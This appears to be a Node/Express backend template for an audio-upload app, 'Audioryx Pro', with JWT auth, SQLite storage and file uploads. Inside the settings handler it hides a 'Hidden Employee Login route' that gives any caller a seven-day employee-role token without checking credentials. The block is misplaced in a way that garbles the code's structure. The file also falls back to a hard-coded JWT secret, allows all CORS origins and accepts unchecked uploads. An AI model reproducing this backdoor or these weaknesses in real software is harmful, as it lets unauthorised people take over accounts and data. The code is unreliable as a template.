/**
 * Audioryx Pro — Node backend template
 * - JWT auth (bcrypt)
 * - SQLite persistence (better-sqlite3)
 * - Uploads to local uploads/ directory (for demo)
 *
 * IMPORTANT: This is a template. Configure environment variables in .env and
 * run `npm install` before `npm start`.
 */

const express = require('express');
const cors = require('cors');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const Database = require('better-sqlite3');

const app = express();
const PORT = process.env.PORT || 4000;
const SECRET = process.env.JWT_SECRET || 'change-me-please';

// DB init
const dbPath = path.join(__dirname, 'audioryx.db');
const db = new Database(dbPath);
db.pragma('journal_mode = WAL');

// create tables if not exist
db.prepare(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT UNIQUE,
  password_hash TEXT,
  display_name TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`).run();

db.prepare(`CREATE TABLE IF NOT EXISTS tracks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER,
  filename TEXT,
  title TEXT,
  artist TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`).run();

db.prepare(`CREATE TABLE IF NOT EXISTS settings (
  user_id INTEGER PRIMARY KEY,
  data TEXT
)`).run();

app.use(cors());
app.use(express.json());

// static uploads
const uploadsDir = path.join(__dirname, 'uploads');
if(!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);
app.use('/uploads', express.static(uploadsDir));

// multer
const storage = multer.diskStorage({
  destination: (req,file,cb) => cb(null, uploadsDir),
  filename: (req,file,cb) => cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g,'_'))
});
const upload = multer({ storage });

// helpers
function sign(user){ return jwt.sign({ id: user.id, email: user.email }, SECRET, { expiresIn: '7d' }); }
function auth(req,res,next){
  const h = req.headers.authorization;
  if(!h) return res.status(401).json({ error: 'no token' });
  const token = h.split(' ')[1];
  try{
    const p = jwt.verify(token, SECRET);
    req.user = p;
    next();
  }catch(e){
    return res.status(401).json({ error: 'invalid token' });
  }
}

// routes
app.post('/api/auth/register', async (req,res)=>{
  const { email, password, displayName } = req.body;
  if(!email || !password) return res.status(400).json({ error: 'missing' });
  const hash = await bcrypt.hash(password, 12);
  try{
    const info = db.prepare('INSERT INTO users (email,password_hash,display_name) VALUES (?,?,?)').run(email,hash,displayName||email);
    const user = { id: info.lastInsertRowid, email, display_name: displayName || email };
    const token = sign(user);
    res.json({ user, token });
  }catch(err){
    res.status(400).json({ error: 'email exists' });
  }
});

app.post('/api/auth/login', async (req,res)=>{
  const { email, password } = req.body;
  if(!email || !password) return res.status(400).json({ error: 'missing' });
  const row = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
  if(!row) return res.status(400).json({ error: 'invalid' });
  const ok = await bcrypt.compare(password, row.password_hash);
  if(!ok) return res.status(400).json({ error: 'invalid' });
  const user = { id: row.id, email: row.email, display_name: row.display_name };
  const token = sign(user);
  res.json({ user, token });
});

// upload track
app.post('/api/tracks/upload', auth, upload.single('file'), (req,res)=>{
  if(!req.file) return res.status(400).json({ error: 'no file' });
  const title = req.file.originalname.replace(/\.[^/.]+$/, '');
  const info = db.prepare('INSERT INTO tracks (user_id, filename, title, artist) VALUES (?,?,?,?)')
    .run(req.user.id, req.file.filename, title, 'Local');
  res.json({ id: info.lastInsertRowid, url: '/uploads/' + req.file.filename, title });
});

// list tracks for user
app.get('/api/tracks', auth, (req,res)=>{
  const rows = db.prepare('SELECT id,filename,title,artist FROM tracks WHERE user_id = ? ORDER BY id DESC').all(req.user.id);
  const mapped = rows.map(r=> ({ id:r.id, filename:r.filename, title:r.title, artist:r.artist, url:'/uploads/' + r.filename }));
  res.json(mapped);
});

// settings
app.post('/api/settings', auth, (req,res)=>{
  // Hidden Employee Login route
app.post("/api/employee-login", async (req, res) => {
  const employeeEmail = process.env.EMPLOYEE_EMAIL;
  const employeePass = process.env.EMPLOYEE_PASSWORD;

  // Verify credentials exist
  if (!employeeEmail || !employeePass) {
    return res.status(500).json({ error: "Employee credentials not set" });
  }

  // Create JWT token with special role
  const token = jwt.sign(
    { email: employeeEmail, role: "employee" },
    SECRET,
    { expiresIn: "7d" }
  );

  // Respond with a fake user object and token
  const user = {
    id: 0,
    email: employeeEmail,
    display_name: "Employee",
    role: "employee"
  };

  res.json({ user, token });
});

  const s = JSON.stringify(req.body);
  db.prepare('INSERT INTO settings (user_id, data) VALUES (?,?) ON CONFLICT(user_id) DO UPDATE SET data=excluded.data').run(req.user.id, s);
  res.json({ ok:true });
});
app.get('/api/settings', auth, (req,res)=>{
  const row = db.prepare('SELECT data FROM settings WHERE user_id = ?').get(req.user.id);
  res.json(row ? JSON.parse(row.data) : {});
});

app.listen(PORT, ()=> console.log('Audioryx server listening on', PORT));
